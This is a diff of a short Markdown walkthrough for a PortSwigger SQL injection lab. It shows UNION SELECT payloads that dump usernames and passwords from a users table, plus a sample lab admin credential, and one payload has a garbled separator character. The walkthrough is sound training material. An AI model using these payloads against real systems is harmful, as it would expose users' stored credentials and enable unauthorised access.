@@ -20,4 +20,6 @@ Now I determine which column is string data: `' UNION SELECT NULL,'a'--`
 
 Now exploit the payload: `' UNION SELECT NULL, username || '`' || password FROM users--`
 
+It will show you the username and password like this: `administrator~c33dy80c5hdjybojdbzf`, use it to log in and we done.
+
 **Source:** [Lab: SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-using-a-sql-injection-union-attack-to-retrieve-interesting-data/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)
